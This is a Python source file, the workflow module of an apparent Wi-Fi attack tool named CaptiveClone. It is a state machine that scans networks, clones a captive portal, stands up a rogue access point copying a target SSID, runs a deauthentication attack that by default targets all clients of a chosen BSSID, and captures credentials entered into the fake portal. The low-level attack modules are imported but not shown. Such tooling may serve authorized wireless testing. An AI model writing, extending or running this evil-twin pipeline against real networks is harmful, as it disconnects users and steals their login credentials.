"""
Workflow module for CaptiveClone.

This module provides state management and transitions between different phases
of CaptiveClone operations, including automatic recovery from failures.
"""

import enum
import json
import logging
import time
import traceback
import datetime
from typing import Dict, List, Optional, Any, Callable, Union, Tuple
from pathlib import Path
import threading
import uuid

from sqlalchemy.orm import Session

from ..database.models import Network
from captiveclone.utils.config import Config
from captiveclone.core.scanner import NetworkScanner
from captiveclone.core.portal_analyzer import PortalAnalyzer
from captiveclone.core.portal_cloner import PortalCloner
from captiveclone.core.access_point import AccessPoint
from captiveclone.core.deauthenticator import Deauthenticator
from captiveclone.core.credential_capture import CredentialCapture
from captiveclone.core.reporting import ReportManager

logger = logging.getLogger(__name__)

class WorkflowState(enum.Enum):
    """States for the CaptiveClone workflow."""
    INITIAL = "initial"
    SCANNING = "scanning"
    SCAN_COMPLETE = "scan_complete"
    ANALYZING = "analyzing"
    ANALYSIS_COMPLETE = "analysis_complete"
    CLONING = "cloning"
    CLONE_COMPLETE = "clone_complete"
    AP_CREATING = "ap_creating"
    AP_RUNNING = "ap_running"
    DEAUTH_STARTING = "deauth_starting"
    DEAUTH_RUNNING = "deauth_running"
    CAPTURING = "capturing"
    REPORTING = "reporting"
    COMPLETE = "complete"
    ERROR = "error"
    STOPPED = "stopped"
    RECOVERY = "recovery"


class WorkflowTransition:
    """Represents a state transition in the workflow."""
    
    def __init__(
        self,
        from_state: WorkflowState,
        to_state: WorkflowState,
        action: Optional[Callable] = None,
        conditions: Optional[List[Callable]] = None,
        recovery_action: Optional[Callable] = None
    ):
        """
        Initialize a new workflow transition.
        
        Args:
            from_state: Source state
            to_state: Target state
            action: Function to execute during transition
            conditions: List of conditions that must be satisfied to allow transition
            recovery_action: Function to execute for recovery if action fails
        """
        self.from_state = from_state
        self.to_state = to_state
        self.action = action
        self.conditions = conditions or []
        self.recovery_action = recovery_action


class WorkflowError(Exception):
    """Base exception for workflow errors."""
    pass


class TransitionError(WorkflowError):
    """Exception raised for errors during state transitions."""
    pass


class StateError(WorkflowError):
    """Exception raised for invalid state operations."""
    pass


class Workflow:
    """Manages the workflow for CaptiveClone operations."""
    
    def __init__(self, config: Config, db_session: Session):
        """
        Initialize a new workflow.
        
        Args:
            config: CaptiveClone configuration
            db_session: SQLAlchemy database session
        """
        self.config = config
        self.db_session = db_session
        self.state = WorkflowState.INITIAL
        self.transitions: Dict[WorkflowState, List[WorkflowTransition]] = {}
        self.state_data: Dict[str, Any] = {}
        self.history: List[Dict[str, Any]] = []
        self.id = str(uuid.uuid4())
        self.errors: List[Dict[str, Any]] = []
        self.recovery_attempts = 0
        self.max_recovery_attempts = config.get("workflow.max_recovery_attempts", 3)
        self.recovery_delay = config.get("workflow.recovery_delay", 5)  # seconds
        
        # Components
        self.scanner: Optional[NetworkScanner] = None
        self.analyzer: Optional[PortalAnalyzer] = None
        self.cloner: Optional[PortalCloner] = None
        self.access_point: Optional[AccessPoint] = None
        self.deauthenticator: Optional[Deauthenticator] = None
        self.credential_capture: Optional[CredentialCapture] = None
        self.report_manager: Optional[ReportManager] = None
        
        # Setup default transitions
        self._setup_transitions()
        
        # Event callbacks
        self.on_state_change_callbacks: List[Callable[[WorkflowState, WorkflowState], None]] = []
        self.on_error_callbacks: List[Callable[[Exception], None]] = []
        
        # Persistent state storage
        self.state_file = Path(config.get("workflow.state_file", "workflow_state.json"))
        
        logger.info(f"Workflow initialized with ID {self.id}")
    
    def _setup_transitions(self) -> None:
        """Setup the default state transitions."""
        # Initialize empty transition lists for each state
        for state in WorkflowState:
            self.transitions[state] = []
        
        # Add standard transitions
        self._add_transition(
            WorkflowState.INITIAL,
            WorkflowState.SCANNING,
            self._start_scanning
        )
        
        self._add_transition(
            WorkflowState.SCANNING,
            WorkflowState.SCAN_COMPLETE,
            self._complete_scanning
        )
        
        self._add_transition(
            WorkflowState.SCAN_COMPLETE,
            WorkflowState.ANALYZING,
            self._start_analysis
        )
        
        self._add_transition(
            WorkflowState.ANALYZING,
            WorkflowState.ANALYSIS_COMPLETE,
            self._complete_analysis
        )
        
        self._add_transition(
            WorkflowState.ANALYSIS_COMPLETE,
            WorkflowState.CLONING,
            self._start_cloning
        )
        
        self._add_transition(
            WorkflowState.CLONING,
            WorkflowState.CLONE_COMPLETE,
            self._complete_cloning
        )
        
        self._add_transition(
            WorkflowState.CLONE_COMPLETE,
            WorkflowState.AP_CREATING,
            self._start_ap_creation
        )
        
        self._add_transition(
            WorkflowState.AP_CREATING,
            WorkflowState.AP_RUNNING,
            self._ap_created
        )
        
        self._add_transition(
            WorkflowState.AP_RUNNING,
            WorkflowState.DEAUTH_STARTING,
            self._start_deauth
        )
        
        self._add_transition(
            WorkflowState.DEAUTH_STARTING,
            WorkflowState.DEAUTH_RUNNING,
            self._deauth_started
        )
        
        self._add_transition(
            WorkflowState.DEAUTH_RUNNING,
            WorkflowState.CAPTURING,
            self._start_capturing
        )
        
        self._add_transition(
            WorkflowState.CAPTURING,
            WorkflowState.REPORTING,
            self._start_reporting
        )
        
        self._add_transition(
            WorkflowState.REPORTING,
            WorkflowState.COMPLETE,
            self._complete_workflow
        )
        
        # Error and recovery transitions
        for state in WorkflowState:
            if state not in [WorkflowState.ERROR, WorkflowState.STOPPED, WorkflowState.RECOVERY]:
                self._add_transition(
                    state,
                    WorkflowState.ERROR,
                    self._handle_error
                )
                
                self._add_transition(
                    state,
                    WorkflowState.STOPPED,
                    self._stop_workflow
                )
        
        self._add_transition(
            WorkflowState.ERROR,
            WorkflowState.RECOVERY,
            self._start_recovery
        )
    
    def _add_transition(
        self,
        from_state: WorkflowState,
        to_state: WorkflowState,
        action: Optional[Callable] = None,
        conditions: Optional[List[Callable]] = None,
        recovery_action: Optional[Callable] = None
    ) -> None:
        """
        Add a new state transition.
        
        Args:
            from_state: Source state
            to_state: Target state
            action: Function to execute during transition
            conditions: List of conditions that must be satisfied to allow transition
            recovery_action: Function to execute for recovery if action fails
        """
        transition = WorkflowTransition(
            from_state=from_state,
            to_state=to_state,
            action=action,
            conditions=conditions,
            recovery_action=recovery_action
        )
        
        self.transitions[from_state].append(transition)
        logger.debug(f"Added transition: {from_state.value} -> {to_state.value}")
    
    def can_transition_to(self, target_state: WorkflowState) -> Tuple[bool, Optional[str]]:
        """
        Check if the workflow can transition to the target state.
        
        Args:
            target_state: Target state to check
            
        Returns:
            Tuple of (can_transition, reason_if_not)
        """
        current_state = self.state
        
        # Find matching transition
        matching_transitions = [
            t for t in self.transitions[current_state]
            if t.to_state == target_state
        ]
        
        if not matching_transitions:
            return False, f"No transition defined from {current_state.value} to {target_state.value}"
        
        # Check conditions for each matching transition
        for transition in matching_transitions:
            conditions_met = all(condition() for condition in transition.conditions)
            if conditions_met:
                return True, None
        
        return False, "Transition conditions not met"
    
    def transition_to(self, target_state: WorkflowState, **kwargs) -> None:
        """
        Transition the workflow to a new state.
        
        Args:
            target_state: Target state to transition to
            **kwargs: Additional parameters for the transition action
            
        Raises:
            TransitionError: If the transition is not allowed or fails
        """
        current_state = self.state
        can_transition, reason = self.can_transition_to(target_state)
        
        if not can_transition:
            raise TransitionError(f"Cannot transition to {target_state.value}: {reason}")
        
        # Find matching transition
        matching_transitions = [
            t for t in self.transitions[current_state]
            if t.to_state == target_state
        ]
        
        # Use the first valid transition
        for transition in matching_transitions:
            conditions_met = all(condition() for condition in transition.conditions)
            if conditions_met:
                logger.info(f"Transitioning from {current_state.value} to {target_state.value}")
                
                # Record in history
                self.history.append({
                    "timestamp": time.time(),
                    "from_state": current_state.value,
                    "to_state": target_state.value,
                    "params": kwargs
                })
                
                # Execute transition action if defined
                if transition.action:
                    try:
                        transition.action(**kwargs)
                    except Exception as e:
                        logger.error(f"Error during transition action: {str(e)}")
                        self._record_error(e)
                        
                        # Try recovery if available
                        if transition.recovery_action:
                            try:
                                logger.info(f"Attempting recovery for {current_state.value} -> {target_state.value}")
                                transition.recovery_action(**kwargs)
                            except Exception as recovery_e:
                                logger.error(f"Recovery failed: {str(recovery_e)}")
                                self.transition_to(WorkflowState.ERROR, error=e)
                                return
                        else:
                            # No recovery action, transition to error state
                            self.transition_to(WorkflowState.ERROR, error=e)
                            return
                
                # Update state
                old_state = self.state
                self.state = target_state
                
                # Save state to disk
                self._save_state()
                
                # Notify state change listeners
                self._notify_state_change(old_state, target_state)
                
                return
        
        # If we get here, no valid transition was found
        raise TransitionError(f"No valid transition found from {current_state.value} to {target_state.value}")
    
    def _record_error(self, error: Exception) -> None:
        """
        Record an error that occurred during workflow processing.
        
        Args:
            error: The exception that occurred
        """
        error_info = {
            "timestamp": time.time(),
            "state": self.state.value,
            "error_type": type(error).__name__,
            "error_message": str(error),
            "traceback": traceback.format_exc()
        }
        
        self.errors.append(error_info)
        
        # Notify error listeners
        for callback in self.on_error_callbacks:
            try:
                callback(error)
            except Exception as e:
                logger.error(f"Error in error callback: {str(e)}")
    
    def _notify_state_change(self, old_state: WorkflowState, new_state: WorkflowState) -> None:
        """
        Notify listeners about a state change.
        
        Args:
            old_state: Previous state
            new_state: New state
        """
        for callback in self.on_state_change_callbacks:
            try:
                callback(old_state, new_state)
            except Exception as e:
                logger.error(f"Error in state change callback: {str(e)}")
    
    def _save_state(self) -> None:
        """Save the current workflow state to disk."""
        try:
            state_data = {
                "id": self.id,
                "state": self.state.value,
                "state_data": self.state_data,
                "history": self.history,
                "errors": self.errors,
                "timestamp": time.time()
            }
            
            with open(self.state_file, 'w', encoding='utf-8') as f:
                json.dump(state_data, f, indent=2)
                
            logger.debug(f"Saved workflow state to {self.state_file}")
        except Exception as e:
            logger.error(f"Failed to save workflow state: {str(e)}")
    
    def load_state(self) -> bool:
        """
        Load the workflow state from disk.
        
        Returns:
            True if the state was loaded successfully, False otherwise
        """
        if not self.state_file.exists():
            logger.info(f"No workflow state file found at {self.state_file}")
            return False
        
        try:
            with open(self.state_file, 'r', encoding='utf-8') as f:
                state_data = json.load(f)
            
            self.id = state_data.get("id", self.id)
            
            # Convert string state to enum
            state_str = state_data.get("state")
            try:
                self.state = WorkflowState(state_str)
            except (ValueError, TypeError):
                logger.warning(f"Invalid state in saved data: {state_str}")
                return False
            
            self.state_data = state_data.get("state_data", {})
            self.history = state_data.get("history", [])
            self.errors = state_data.get("errors", [])
            
            logger.info(f"Loaded workflow state: {self.state.value}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to load workflow state: {str(e)}")
            return False
    
    def on_state_change(self, callback: Callable[[WorkflowState, WorkflowState], None]) -> None:
        """
        Register a callback to be called when the workflow state changes.
        
        Args:
            callback: Function to call when state changes, takes old_state and new_state as arguments
        """
        self.on_state_change_callbacks.append(callback)
    
    def on_error(self, callback: Callable[[Exception], None]) -> None:
        """
        Register a callback to be called when an error occurs.
        
        Args:
            callback: Function to call when an error occurs, takes the exception as an argument
        """
        self.on_error_callbacks.append(callback)
    
    def start(self, network_interface: Optional[str] = None) -> None:
        """
        Start the workflow from the initial state.
        
        Args:
            network_interface: Network interface to use for scanning
        """
        if self.state != WorkflowState.INITIAL:
            logger.warning(f"Workflow already started, current state: {self.state.value}")
            return
        
        logger.info("Starting CaptiveClone workflow")
        self.transition_to(WorkflowState.SCANNING, interface=network_interface)
    
    def stop(self) -> None:
        """
        Stop the workflow at the current stage.
        """
        logger.info(f"Stopping workflow from state {self.state.value}")
        self.transition_to(WorkflowState.STOPPED)
    
    # Implementation of state transition actions
    
    def _start_scanning(self, interface: Optional[str] = None, **kwargs) -> None:
        """
        Start network scanning.
        
        Args:
            interface: Network interface to use for scanning
        """
        logger.info(f"Starting network scan on interface: {interface or 'default'}")
        
        # Initialize scanner if not already created
        if not self.scanner:
            self.scanner = NetworkScanner(
                interface=interface,
                db_session=self.db_session,
                config=self.config
            )
        
        # Start scanning in a background thread
        def scan_thread():
            try:
                networks = self.scanner.scan()
                self.state_data["networks"] = [
                    {
                        "id": network.id,
                        "ssid": network.ssid,
                        "bssid": network.bssid
                    }
                    for network in networks
                ]
                self.state_data["network_count"] = len(networks)
                self.state_data["captive_portal_count"] = sum(1 for n in networks if n.has_captive_portal)
                
                # Complete the scan
                self.transition_to(WorkflowState.SCAN_COMPLETE)
                
            except Exception as e:
                logger.error(f"Error during network scan: {str(e)}")
                self._record_error(e)
                self.transition_to(WorkflowState.ERROR, error=e)
        
        # Start the scan thread
        threading.Thread(target=scan_thread, daemon=True).start()
    
    def _complete_scanning(self, **kwargs) -> None:
        """Complete the network scanning phase."""
        logger.info(f"Scan complete. Found {self.state_data.get('network_count', 0)} networks, "
                   f"{self.state_data.get('captive_portal_count', 0)} captive portals.")
    
    def _start_analysis(self, network_id: Optional[int] = None, url: Optional[str] = None, **kwargs) -> None:
        """
        Start captive portal analysis.
        
        Args:
            network_id: ID of the network to analyze
            url: URL of the captive portal to analyze (alternative to network_id)
        """
        if not network_id and not url:
            raise ValueError("Either network_id or url must be provided for portal analysis")
        
        logger.info(f"Starting portal analysis for network_id={network_id}, url={url}")
        
        # Initialize analyzer if not already created
        if not self.analyzer:
            self.analyzer = PortalAnalyzer(config=self.config, db_session=self.db_session)
        
        # Start analysis in a background thread
        def analyze_thread():
            try:
                if network_id:
                    portal = self.analyzer.analyze_network(network_id)
                else:
                    portal = self.analyzer.analyze_portal(url)
                
                self.state_data["portal"] = {
                    "id": portal.id if hasattr(portal, 'id') else None,
                    "login_url": portal.login_url,
                    "requires_authentication": portal.requires_authentication
                }
                
                # Complete the analysis
                self.transition_to(WorkflowState.ANALYSIS_COMPLETE)
                
            except Exception as e:
                logger.error(f"Error during portal analysis: {str(e)}")
                self._record_error(e)
                self.transition_to(WorkflowState.ERROR, error=e)
        
        # Start the analysis thread
        threading.Thread(target=analyze_thread, daemon=True).start()
    
    def _complete_analysis(self, **kwargs) -> None:
        """Complete the portal analysis phase."""
        logger.info("Portal analysis complete.")
        if "portal" in self.state_data:
            portal = self.state_data["portal"]
            logger.info(f"Portal login URL: {portal.get('login_url')}")
            logger.info(f"Authentication required: {portal.get('requires_authentication')}")
    
    def _start_cloning(self, portal_id: Optional[int] = None, output_dir: Optional[str] = None, **kwargs) -> None:
        """
        Start captive portal cloning.
        
        Args:
            portal_id: ID of the captive portal to clone
            output_dir: Directory to output the cloned portal to
        """
        if not portal_id and "portal" not in self.state_data:
            raise ValueError("Portal ID must be provided for cloning")
        
        portal_id = portal_id or self.state_data["portal"].get("id")
        if not portal_id:
            raise ValueError("Portal ID not available in state data")
        
        logger.info(f"Starting portal cloning for portal_id={portal_id}")
        
        # Initialize cloner if not already created
        if not self.cloner:
            self.cloner = PortalCloner(config=self.config, db_session=self.db_session)
        
        # Start cloning in a background thread
        def clone_thread():
            try:
                clone_path = self.cloner.clone_portal_by_id(portal_id, output_dir=output_dir)
                
                self.state_data["clone"] = {
                    "path": clone_path,
                    "output_dir": output_dir
                }
                
                # Complete the cloning
                self.transition_to(WorkflowState.CLONE_COMPLETE)
                
            except Exception as e:
                logger.error(f"Error during portal cloning: {str(e)}")
                self._record_error(e)
                self.transition_to(WorkflowState.ERROR, error=e)
        
        # Start the clone thread
        threading.Thread(target=clone_thread, daemon=True).start()
    
    def _complete_cloning(self, **kwargs) -> None:
        """Complete the portal cloning phase."""
        logger.info("Portal cloning complete.")
        if "clone" in self.state_data:
            clone = self.state_data["clone"]
            logger.info(f"Clone path: {clone.get('path')}")
    
    def _start_ap_creation(self, interface: Optional[str] = None, network_id: Optional[int] = None,
                          ssid: Optional[str] = None, channel: Optional[int] = None, **kwargs) -> None:
        """
        Start access point creation.
        
        Args:
            interface: Network interface to use for the AP
            network_id: ID of the network to mimic
            ssid: SSID for the access point (alternative to network_id)
            channel: Channel for the access point
        """
        if not interface:
            raise ValueError("Interface must be provided for AP creation")
        
        if not network_id and not ssid:
            raise ValueError("Either network_id or ssid must be provided for AP creation")
        
        logger.info(f"Starting AP creation on interface={interface}, network_id={network_id}, ssid={ssid}")
        
        # Initialize access point if not already created
        if not self.access_point:
            self.access_point = AccessPoint(config=self.config)
        
        # Start AP creation in a background thread
        def ap_thread():
            try:
                if network_id:
                    ap_info = self.access_point.create_from_network(network_id, interface)
                else:
                    ap_info = self.access_point.create(interface, ssid, channel=channel)
                
                self.state_data["access_point"] = {
                    "interface": interface,
                    "ssid": ap_info.get("ssid"),
                    "channel": ap_info.get("channel"),
                    "running": True
                }
                
                # AP created successfully
                self.transition_to(WorkflowState.AP_RUNNING)
                
            except Exception as e:
                logger.error(f"Error during AP creation: {str(e)}")
                self._record_error(e)
                self.transition_to(WorkflowState.ERROR, error=e)
        
        # Start the AP thread
        threading.Thread(target=ap_thread, daemon=True).start()
    
    def _ap_created(self, **kwargs) -> None:
        """Handle access point created event."""
        logger.info("Access point created and running.")
        if "access_point" in self.state_data:
            ap = self.state_data["access_point"]
            logger.info(f"AP SSID: {ap.get('ssid')}, Channel: {ap.get('channel')}")
    
    def _start_deauth(self, interface: Optional[str] = None, network_id: Optional[int] = None,
                     bssid: Optional[str] = None, client_macs: Optional[List[str]] = None, **kwargs) -> None:
        """
        Start deauthentication attack.
        
        Args:
            interface: Network interface to use for deauthentication
            network_id: ID of the network to target
            bssid: BSSID of the network to target (alternative to network_id)
            client_macs: List of client MAC addresses to target (None for all)
        """
        if not interface:
            raise ValueError("Interface must be provided for deauthentication")
        
        if not network_id and not bssid:
            raise ValueError("Either network_id or bssid must be provided for deauthentication")
        
        logger.info(f"Starting deauthentication on interface={interface}, "
                   f"network_id={network_id}, bssid={bssid}")
        
        # Initialize deauthenticator if not already created
        if not self.deauthenticator:
            self.deauthenticator = Deauthenticator(config=self.config)
        
        # Start deauth in a background thread
        def deauth_thread():
            try:
                if network_id:
                    # Get BSSID from network ID
                    network = self.db_session.query(Network).get(network_id)
                    if not network:
                        raise ValueError(f"Network with ID {network_id} not found")
                    target_bssid = network.bssid
                else:
                    target_bssid = bssid
                
                self.deauthenticator.start(interface, target_bssid, client_macs=client_macs)
                
                self.state_data["deauth"] = {
                    "interface": interface,
                    "bssid": target_bssid,
                    "client_macs": client_macs,
                    "running": True
                }
                
                # Deauth started successfully
                self.transition_to(WorkflowState.DEAUTH_RUNNING)
                
            except Exception as e:
                logger.error(f"Error during deauthentication: {str(e)}")
                self._record_error(e)
                self.transition_to(WorkflowState.ERROR, error=e)
        
        # Start the deauth thread
        threading.Thread(target=deauth_thread, daemon=True).start()
    
    def _deauth_started(self, **kwargs) -> None:
        """Handle deauthentication started event."""
        logger.info("Deauthentication attack started.")
        if "deauth" in self.state_data:
            deauth = self.state_data["deauth"]
            logger.info(f"Targeting BSSID: {deauth.get('bssid')}")
            if deauth.get('client_macs'):
                logger.info(f"Targeting specific clients: {', '.join(deauth.get('client_macs'))}")
            else:
                logger.info("Targeting all clients")
    
    def _start_capturing(self, port: Optional[int] = None, **kwargs) -> None:
        """
        Start credential capturing.
        
        Args:
            port: Port to listen on for credential capture
        """
        port = port or self.config.get("credential_capture.port", 8080)
        
        logger.info(f"Starting credential capture on port {port}")
        
        # Initialize credential capture if not already created
        if not self.credential_capture:
            self.credential_capture = CredentialCapture(config=self.config, db_session=self.db_session)
        
        # Start capture in a background thread
        def capture_thread():
            try:
                self.credential_capture.start(port=port)
                
                self.state_data["capture"] = {
                    "port": port,
                    "running": True,
                    "start_time": time.time()
                }
                
                # Automatically transition to reporting after some time
                report_delay = self.config.get("workflow.auto_report_delay", 3600)  # Default 1 hour
                time.sleep(report_delay)
                
                # If we're still in the capturing state, start reporting
                if self.state == WorkflowState.CAPTURING:
                    self.transition_to(WorkflowState.REPORTING)
                
            except Exception as e:
                logger.error(f"Error during credential capture: {str(e)}")
                self._record_error(e)
                self.transition_to(WorkflowState.ERROR, error=e)
        
        # Start the capture thread
        threading.Thread(target=capture_thread, daemon=True).start()
    
    def _start_reporting(self, title: Optional[str] = None, description: Optional[str] = None,
                        format: str = "pdf", **kwargs) -> None:
        """
        Start report generation.
        
        Args:
            title: Report title
            description: Report description
            format: Report format ("pdf" or "html")
        """
        title = title or f"CaptiveClone Report - {datetime.datetime.now().strftime('%Y-%m-%d')}"
        description = description or "Automatic report generated by CaptiveClone workflow"
        
        logger.info(f"Generating {format} report: {title}")
        
        # Initialize report manager if not already created
        if not self.report_manager:
            self.report_manager = ReportManager(config=self.config, db_session=self.db_session)
        
        # Start reporting in a background thread
        def report_thread():
            try:
                # Get network IDs from state data if available
                network_ids = None
                if "networks" in self.state_data:
                    network_ids = [n.get("id") for n in self.state_data["networks"] if n.get("id")]
                
                report_path = self.report_manager.generate_report(
                    title=title,
                    description=description,
                    report_format=format,
                    network_ids=network_ids
                )
                
                self.state_data["report"] = {
                    "path": report_path,
                    "title": title,
                    "format": format,
                    "generation_time": time.time()
                }
                
                # Report generated successfully
                self.transition_to(WorkflowState.COMPLETE)
                
            except Exception as e:
                logger.error(f"Error during report generation: {str(e)}")
                self._record_error(e)
                self.transition_to(WorkflowState.ERROR, error=e)
        
        # Start the report thread
        threading.Thread(target=report_thread, daemon=True).start()
    
    def _complete_workflow(self, **kwargs) -> None:
        """Handle workflow completion."""
        logger.info("Workflow completed successfully")
        
        # Cleanup resources
        self._cleanup_resources()
    
    def _stop_workflow(self, **kwargs) -> None:
        """Handle workflow stop."""
        logger.info("Workflow stopped by user")
        
        # Cleanup resources
        self._cleanup_resources()
    
    def _handle_error(self, error: Exception, **kwargs) -> None:
        """
        Handle workflow error.
        
        Args:
            error: The exception that occurred
        """
        logger.error(f"Workflow error in state {self.state.value}: {str(error)}")
        
        # Attempt recovery
        if self.recovery_attempts < self.max_recovery_attempts:
            self.recovery_attempts += 1
            logger.info(f"Attempting recovery (attempt {self.recovery_attempts}/{self.max_recovery_attempts})")
            
            # Delay before recovery
            time.sleep(self.recovery_delay)
            
            # Transition to recovery state
            self.transition_to(WorkflowState.RECOVERY)
        else:
            logger.error(f"Max recovery attempts ({self.max_recovery_attempts}) reached. Workflow failed.")
            
            # Cleanup resources
            self._cleanup_resources()
    
    def _start_recovery(self, **kwargs) -> None:
        """Start recovery process from an error."""
        logger.info(f"Starting recovery from state {self.state.value}")
        
        # Determine the best state to go back to
        recovery_map = {
            WorkflowState.SCANNING: WorkflowState.INITIAL,
            WorkflowState.ANALYZING: WorkflowState.SCAN_COMPLETE,
            WorkflowState.CLONING: WorkflowState.ANALYSIS_COMPLETE,
            WorkflowState.AP_CREATING: WorkflowState.CLONE_COMPLETE,
            WorkflowState.DEAUTH_STARTING: WorkflowState.AP_RUNNING,
            WorkflowState.CAPTURING: WorkflowState.DEAUTH_RUNNING,
            WorkflowState.REPORTING: WorkflowState.CAPTURING
        }
        
        # Find the last non-error state in history
        last_state = None
        for entry in reversed(self.history):
            if entry["to_state"] not in [WorkflowState.ERROR.value, WorkflowState.RECOVERY.value]:
                last_state = WorkflowState(entry["to_state"])
                break
        
        if last_state and last_state in recovery_map:
            # Go back to the appropriate state
            recovery_state = recovery_map[last_state]
            logger.info(f"Attempting to recover by going back to {recovery_state.value}")
            
            # Reset the current state to recovery target
            self.state = recovery_state
            
            # Save the recovered state
            self._save_state()
            
            # Restart from the recovered state
            # This will depend on the specific state we're recovering to
            if recovery_state == WorkflowState.INITIAL:
                interface = self.state_data.get("network_interface")
                self.start(network_interface=interface)
            elif recovery_state == WorkflowState.SCAN_COMPLETE:
                portal_id = None
                if "portal" in self.state_data:
                    portal_id = self.state_data["portal"].get("id")
                
                url = None
                if "portal" in self.state_data:
                    url = self.state_data["portal"].get("login_url")
                
                if portal_id:
                    self.transition_to(WorkflowState.ANALYZING, network_id=portal_id)
                elif url:
                    self.transition_to(WorkflowState.ANALYZING, url=url)
                else:
                    logger.error("Cannot recover: no portal information available")
                    self.transition_to(WorkflowState.ERROR)
            # Add more state-specific recovery logic as needed
        else:
            logger.error("Cannot determine appropriate recovery state")
            self.transition_to(WorkflowState.ERROR)
    
    def _cleanup_resources(self) -> None:
        """Clean up resources used by the workflow."""
        logger.info("Cleaning up workflow resources")
        
        # Stop deauthentication if running
        if self.deauthenticator and self.state_data.get("deauth", {}).get("running"):
            try:
                self.deauthenticator.stop()
                self.state_data["deauth"]["running"] = False
                logger.info("Deauthentication stopped")
            except Exception as e:
                logger.error(f"Error stopping deauthentication: {str(e)}")
        
        # Stop access point if running
        if self.access_point and self.state_data.get("access_point", {}).get("running"):
            try:
                self.access_point.stop()
                self.state_data["access_point"]["running"] = False
                logger.info("Access point stopped")
            except Exception as e:
                logger.error(f"Error stopping access point: {str(e)}")
        
        # Stop credential capture if running
        if self.credential_capture and self.state_data.get("capture", {}).get("running"):
            try:
                self.credential_capture.stop()
                self.state_data["capture"]["running"] = False
                logger.info("Credential capture stopped")
            except Exception as e:
                logger.error(f"Error stopping credential capture: {str(e)}")
        
        # Save final state
        self._save_state()
